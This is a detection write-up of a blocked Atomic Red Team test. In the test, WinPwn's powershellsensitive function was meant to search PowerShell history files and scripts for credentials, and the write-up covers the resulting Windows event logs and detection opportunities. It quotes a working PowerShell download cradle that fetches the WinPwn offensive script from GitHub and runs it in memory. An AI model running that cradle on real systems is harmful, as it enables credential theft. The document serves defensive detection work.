# T1552.001-9: Credentials In Files — WinPwn - powershellsensitive

## Technique Context

MITRE ATT&CK T1552.001 (Credentials in Files) includes searching PowerShell history files, profiles, and scripts for stored credentials. Test 9 uses WinPwn's `powershellsensitive` function, which scans PowerShell-related locations for credential material — specifically targeting `ConsoleHost_history.txt` (the PowerShell command history file), PowerShell profile scripts, module files, and any `.ps1` scripts accessible on the system for patterns matching passwords, API keys, and similar secrets. Like tests 7 and 8, WinPwn is downloaded from GitHub at runtime. Defender blocked execution via AMSI.

## What This Dataset Contains

The dataset spans approximately seven seconds (00:26:36–00:26:43 UTC) and contains 99 events across three log sources.

**The attempt and block are fully captured.** PowerShell EID 4104 script block logging preserves:

```
& {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powershellsensitive -consoleoutput -noninteractive}
```

EID 4103 records `CommandInvocation(New-Object)` with `TypeName: net.webclient` confirming the download cradle fired.

PowerShell EID 4100 records the Defender block:

```
Error Message = At line:1 char:1
+ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
This script contains malicious content and has been blocked by your antivirus software.
Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpression
```

Security EID 4688 records the PowerShell process (PID 0x164c) and EID 4689 records its exit. A second Security 4688/4689 pair records `whoami.exe` — the standard ART test framework identity check.

Sysmon shows the PowerShell DLL image load sequence (EID 7), named pipe creation (EID 17), and process access events (EID 10) from the parent test framework process. No network connection (EID 3) or DNS query (EID 22) events appear in the bundled data for this test window, consistent with the pattern observed in test 8.

## What This Dataset Does Not Contain (and Why)

**`powershellsensitive` did not execute.** Defender blocked WinPwn before the function ran. PowerShell history files, profile scripts, and `.ps1` files were not scanned. No file access events or credential hits appear.

**No PowerShell history file access.** The primary target of `powershellsensitive` — `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` — was never read.

**No network or DNS events in the bundled window.** Like test 8, the collection window does not include the Sysmon network events. The EID 4103 module log confirms the `net.webclient` object was created, indicating a download was attempted.

## Assessment

Tests 7, 8, and 9 form a tight trio of WinPwn-via-download-cradle executions blocked by Defender. In all three, the script block log captures the function name — `sensitivefiles`, `Snaffler`, and `powershellsensitive` respectively — making this differentiation possible at the detection layer. The `powershellsensitive` variant is specifically notable because PowerShell history files are a high-value target in real intrusions; they frequently contain credentials typed interactively, including those for cloud CLIs (`az login`, `aws configure`), database connections, and REST API calls. The dataset reflects realistic EDR-defended conditions where the tool is blocked but the intent is fully logged.

## Detection Opportunities Present in This Data

- **PowerShell EID 4104**: Script block referencing the WinPwn URL with `powershellsensitive` as the function name. This is the cleanest indicator for this specific capability.
- **PowerShell EID 4100**: AMSI block on `Invoke-Expression` with `ScriptContainedMaliciousContent` — pairs with the preceding EID 4104 to confirm what was blocked.
- **PowerShell EID 4103**: `New-Object net.webclient` immediately preceding a download string call is a generic but reliable in-memory execution cradle indicator.
- **Behavioral sequence**: The three-event sequence — EID 4104 (script block with `iex(new-object net.webclient).downloadstring`), followed by EID 4103 (net.webclient invocation), followed by EID 4100 (AMSI block) — is a distinctive and high-confidence behavioral signature.
- **Hunting for PowerShell history access**: In a scenario where Defender did not block execution, the `powershellsensitive` function would access `ConsoleHost_history.txt` paths. Object access auditing for these files would provide detection coverage for the unblocked case, which this dataset's configuration does not include.
- **Cross-test correlation**: Analysts should treat tests 7, 8, and 9 as a cluster — the same infrastructure, same commit hash, same AMSI response. A single rule covering the WinPwn GitHub URL pattern catches all three.
